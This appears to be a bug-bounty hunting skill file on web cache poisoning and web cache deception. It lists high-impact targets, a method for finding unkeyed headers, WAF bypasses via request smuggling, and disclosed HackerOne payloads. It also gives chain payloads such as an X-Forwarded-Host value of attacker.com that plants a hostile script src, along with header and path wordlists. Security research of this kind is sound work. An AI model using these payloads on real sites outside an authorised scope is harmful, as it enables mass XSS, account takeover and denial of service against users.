Cache poisoning is high-value because a single poisoned cache entry can affect thousands or millions of victims simultaneously; one request, mass exploitation. Payout scales with blast radius.
- **CDN-served assets** (cdn.shopify.com, cloudfront distributions, Fastly/Akamai edges); impact depends on cache key, edge location, routing and actual consumers
- **E-commerce platforms** with affiliate/referral flows (Shopify, WooCommerce storefronts); session hijack or affiliate fraud potential
- **Gaming platforms with update servers** (rockstargames updates.* domains); DoS on update delivery = widespread client breakage
- **Authentication endpoints** served through caches; leads to account takeover (the highest severity variant)
- **Asset CDNs** (JS/CSS delivery); XSS payload delivery at scale
- **SaaS multi-tenant platforms**; one poisoned response bleeds into all tenants sharing a cache key
**Two distinct attacks live under this skill; target the simpler one first.**
**Attack 1; Password Reset Poisoning (Host header injection):**
Try multiple host headers; apps vary in which one they trust (`X-Forwarded-Host` is most common, but `Host` itself also works when the proxy passes it through).
**Attack 2; Web Cache Poisoning:**
2. **Identify cache key components.** Send two identical requests; if `Age` increments, the response is cached. Vary headers one-by-one (e.g., add `X-Forwarded-Host`) to determine which headers are NOT included in the cache key (unkeyed).
7. **Validate cache storage.** After sending a potentially poisoned request, immediately request the same URL WITHOUT the malicious header from a different IP or incognito session. If you receive the poisoned response; it's confirmed.
1. **CDN misconfiguration; caching based on URL path only.** Engineers configure cache rules like "cache everything matching `*.js`" without realizing the path can be appended to dynamic routes. The origin server ignores the extra path segments, but the CDN uses them as cache keys.
7. **Third-party integrations with URL reflection.** Affiliate/link tracking systems (like Shopify Linkpop) reflect the destination URL in metadata, canonical tags, or redirects; and these get cached globally.
- Bypass: Inject via HTTP Request Smuggling; smuggle a request with poison headers past the WAF to hit the cache server directly
- Bypass: Web Cache Deception; trick the cache into storing authenticated content by appending `.css`/`.js` to the URL, which matches a cache rule that ignores auth
- Bypass: HTTP Parameter Pollution; some parsers take the first occurrence, caches key on full string; a parser or normalization mismatch must be demonstrated; two different fully keyed query strings do not by themselves share an entry
- Bypass: Fat GET request; send body parameters that the backend processes but the cache ignores
   The attacker must be able to poison a cache entry and then demonstrate that a *separate, unauthenticated request* from a different client/IP receives the poisoned response; not just their own browser. If only the attacker sees the effect, it's not cache poisoning.
**Scenario 1; Mass DoS on CDN Asset Delivery (Shopify CDN)**
An attacker identified that CDN-served JavaScript assets on `cdn.shopify.com` could be poisoned by sending a request with a crafted header that caused the origin to return a 4xx error. The CDN cached this error response. Any merchant storefront loading that asset then received the cached error instead of the valid JS file; breaking checkout flows and storefront functionality across all stores sharing that CDN path. One HTTP request, global merchant impact, persisting until cache TTL expired.
**Scenario 2; Account Takeover via Web Cache Deception**
On a platform serving authenticated account pages, an attacker crafted a URL like `/account/profile/photo.jpg` and sent it to a victim (via phishing link). When the victim (authenticated) visited the URL, the server responded with their full account profile page (name, email, session tokens). Because the URL ended in `.jpg`, the CDN cached the authenticated response publicly. The attacker then fetched `/account/profile/photo.jpg` without authentication and received the victim's account data; enabling full account takeover. Impact was amplified because the cache served the same response to any subsequent requester.
**Scenario 3; Affiliate Link Hijacking via URL Path Manipulation (Shopify Linkpop)**
1. **Shopify; Cache poisoning via X-Forwarded-Host** ([H1 #977851](https://hackerone.com/reports/977851))
    - Payload: `GET /any-path` with `X-Forwarded-Host: attacker.com`; single request persisted attacker host in cached response across `apps.shopify.com` and localized subdomains
    - Year: 2020; **$1,300 → escalated to $6,300** (one-shot poison, multi-host blast radius)
2. **HackerOne; Cache poisoning DoS via X-Forwarded-Port** ([H1 #409370](https://hackerone.com/reports/409370))
    - Payload: `GET /<redirect-path>` with `X-Forwarded-Port: 1`; cached 301 redirect pointed legitimate users at port 1, breaking access
    - Year: 2018; **$2,500** (foundational H1-on-H1 case)
3. **GitLab; Cache poisoning DoS via X-HTTP-Method-Override** ([H1 #1160407](https://hackerone.com/reports/1160407))
    - Payload: `GET /assets/webpack/*.js` with `X-HTTP-Method-Override: HEAD`; GCS backend honored the override and returned an empty body; CDN cached it as the canonical GET response
    - Year: 2021; **$2,500** (DoS normally OOS, paid for novelty)
4. **PayPal; Web Cache Deception (Omer Gil original)** ([Blog](https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html))
    - Payload: `GET https://www.paypal.com/myaccount/home/foo.css`; origin served full authenticated account page; CDN cached it as "static .css" for ~5 hours
    - Year: 2017; **$3,000** (PortSwigger Top-10 Web Hacking Technique of 2017, #2)
5. **Cloudflare PBB; Cache Deception Armor bypass via `.avif`** ([H1 #1391635](https://hackerone.com/reports/1391635))
    - Payload: `GET https://<protected-origin>/account/me.avif`; Cloudflare's Cache Deception Armor extension list omitted `.avif`, so the authenticated HTML response was cached
    - Year: 2022; Cloudflare PBB bounty (amount undisclosed)
6. **Akamai (PayPal/Airbnb/Goldman Sachs); Hop-by-hop header smuggling → server-side edge poisoning** ([Tediosi & Mariani writeup](https://medium.com/@jacopotediosi/worldwide-server-side-cache-poisoning-on-all-akamai-edge-nodes-50k-bounty-earned-f97d80f3922b))
    - Payload: `Connection: Content-Length` + crafted request; Akamai's first proxy stripped Content-Length as hop-by-hop, second proxy treated body as a second request whose response was cached at the edge
    - Year: 2022; **>$50K total** across affected programs (PayPal $25,200 + Airbnb $14,875 + Goldman Sachs $100), PortSwigger Top-10 Web Hacking Techniques 2022 nominee
7. **James Kettle (PortSwigger); "Gotta cache 'em all": path-normalization & WCD against Cloudflare/Fastly/GCP** ([PortSwigger Research](https://portswigger.net/research/gotta-cache-em-all))
    - Subclass: cache-key path normalization discrepancies and Web Cache Deception across major CDNs (Cloudflare, Fastly, GCP/Google Cloud); the 2024 research named in this skill's description
    - Year: 2024; coordinated CDN-vendor disclosure; methodology research (no single bounty), PortSwigger Top-10 Web Hacking Techniques 2024 entry
- **`hunt-xss`**; Cache poisoning is the multiplier that turns reflected XSS (low-severity self-inflicted) into stored XSS across every CDN-edge visitor. Chain primitive: `X-Forwarded-Host: attacker.com` poisons cached script src → cached response now contains `<script src="//attacker.com/x.js">` → every visitor to that CDN edge executes attacker JS, persistent for the full Cache-Control max-age.
- **`hunt-http-smuggling`**; Smuggling bypasses front-end cache-key normalization and WAF stripping of poison headers, hitting the cache server directly. Chain primitive: CL.TE smuggle delivers `X-Forwarded-Host: attacker.com` to the cache backend past the WAF that stripped it at the edge → poisoned entry stored under the victim's normal URL → de-sync poisoning where the smuggled request becomes the cached response for the next victim.
- **`hunt-auth-bypass`**; Web Cache Deception turns authenticated pages into publicly-cached responses, leaking session-bound content to unauthenticated attackers. Chain primitive: `/account/profile.css` served as authenticated HTML, cached as static asset → attacker fetches same URL without auth and reads victim's email/tokens → session cookies in body → full ATO.
- **`security-arsenal`**; Reach for the unkeyed-header wordlist (`X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, `Forwarded`, `X-Original-URL`) and the WCD path-extension list (`.css`, `.js`, `.jpg`, `.ico`, `;.css`, `%2e%2ecss`) before hand-fuzzing.
- **`triage-validation`**; Run the Pre-Severity Gate before claiming Critical: the poisoned response MUST be reproducible from a separate IP/incognito without your poison headers. If only your own browser sees the effect, it's a self-cache and N/A.
- You need the recon, exploitation, or validation workflow described below; executed strictly inside the approved scope.